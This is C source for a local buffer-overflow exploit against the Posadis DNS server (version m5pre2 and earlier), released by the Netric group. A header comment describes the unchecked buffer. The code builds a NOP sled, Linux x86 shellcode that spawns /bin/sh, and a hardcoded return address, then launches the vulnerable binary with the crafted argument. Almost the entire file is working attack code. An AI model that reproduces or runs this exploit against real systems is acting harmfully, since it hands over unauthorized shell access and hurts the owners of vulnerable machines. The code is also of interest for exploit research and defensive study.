/* local posadis m5pre2 exploit by eSDee of Netric - (www.netric.org)
 * ------------------------------------------------------------------
 * The formatstring bug (discovered by kkr) is fixed in the log_print
 * function in m5pre2. However, there exists an unchecked buffer in
 * m5pre2 and prior, that can be exploited too.
 * ------------------------------------------------------------------
 */

#include <stdio.h>

char shellcode[]=
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int
main ()
{
        unsigned long ret = 0xbffff550;
        char buf[4068];
        int i=0;

        memset(buf, 0x90, sizeof(buf));

        for (0; i < sizeof(shellcode) - 1;i++) {
                buf[4000+i] = shellcode[i];
        }

        buf[4063] = (ret & 0x000000ff);
        buf[4064] = (ret & 0x0000ff00) >> 8;
        buf[4065] = (ret & 0x00ff0000) >> 16;
        buf[4066] = (ret & 0xff000000) >> 24;
        buf[4067] = '\0';

        printf("ret: 0x%x\n",ret);
        execl("./posadis", "posadis", buf, NULL);

        return 0;
}
